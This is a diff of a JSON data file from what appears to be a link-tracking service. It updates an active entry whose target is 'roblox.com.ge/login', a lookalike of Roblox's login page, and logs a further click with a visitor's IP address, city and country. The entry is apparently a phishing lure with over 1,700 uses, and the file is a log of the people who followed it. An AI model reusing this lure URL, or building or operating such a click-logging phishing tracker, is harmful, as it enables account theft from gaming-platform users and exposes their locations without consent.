@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1719,
+    "useCount": 1720,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13915,6 +13915,14 @@
       },
       {
         "timestamp": 1783105090380,
+        "ip": "64.217.135.56",
+        "country": "United States",
+        "city": "Avon",
+        "flag": "🇺🇸",
+        "countryCode": "US"
+      },
+      {
+        "timestamp": 1783105091697,
         "ip": "64.217.135.56",
         "country": "United States",
         "city": "Avon",
